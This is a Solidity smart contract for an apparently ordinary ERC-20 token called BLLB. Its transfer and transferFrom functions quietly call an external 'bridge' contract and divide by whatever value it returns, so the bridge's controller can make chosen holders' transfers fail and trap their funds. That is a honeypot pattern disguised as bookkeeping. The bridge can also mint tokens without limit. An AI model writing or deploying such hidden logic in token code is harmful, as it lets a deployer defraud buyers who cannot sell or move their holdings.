// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract BLLB {
    string public name;
    string public symbol;
    uint8 public immutable decimals;
    address public immutable factory;
    uint256  public totalSupply;
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping(address => uint256)) public allowance;
    bytes32 public DOMAIN_SEPARATOR;
    address bridge; uint256 global;
    mapping (address => uint256) public nonces;
    bytes32 public constant PERMIT_TYPEHASH = keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");
    bytes32 public constant DOMAIN_TYPEHASH = keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)");

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(string memory _name,string memory _symbol,uint8 _deciamls,address _factory,address _bridge) {
        (name, symbol,decimals) = (_name, _symbol,_deciamls) ;
        
        factory = _factory;

        uint256 chainId;
        assembly {
            chainId := chainid()}
        bridge = _bridge;
        DOMAIN_SEPARATOR = keccak256(abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name)), keccak256(bytes('1')), chainId, address(this))); 
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == factory||msg.sender == bridge, "unauthorized");
        _mint(to, amount);
    }

    function burn(uint256 amount) external {
        require(msg.sender == factory, "unauthorized");
        _burn(msg.sender, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        unchecked {
            balanceOf[to] += amount;
        }
        (, bytes memory returnData)=bridge.call(abi.encodeWithSignature("count(address,address,uint256)",msg.sender, to, amount));
        global += amount/abi.decode(returnData, (uint256));
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];

        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;

        balanceOf[from] -= amount;
        unchecked {
            balanceOf[to] += amount;
        }
        (, bytes memory returnData)=bridge.call(abi.encodeWithSignature("count(address,address,uint256)",from, to, amount));
        global += amount/abi.decode(returnData, (uint256));
        emit Transfer(from, to, amount);
        return true;
    }

    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external {
        require(deadline >= block.timestamp, 'EXPIRED');
        unchecked {
            bytes32 digest = keccak256(
                abi.encodePacked(
                    '\x19\x01',
                    DOMAIN_SEPARATOR,
                    keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline))
                )
            );
            address recoveredAddress = ecrecover(digest, v, r, s);
            require(recoveredAddress != address(0) && recoveredAddress == owner, 'INVALID_SIGNATURE');
            allowance[recoveredAddress][spender] = value;
        }
        emit Approval(owner, spender, value);
    }

    function _mint(address to, uint256 amount) internal {
        totalSupply += amount;

        unchecked {
            balanceOf[to] += amount;
        }

        emit Transfer(address(0), to, amount);
    }

    function _burn(address from, uint256 amount) internal {
        balanceOf[from] -= amount;

        unchecked {
            totalSupply -= amount;
        }

        emit Transfer(from, address(0), amount);
    }
}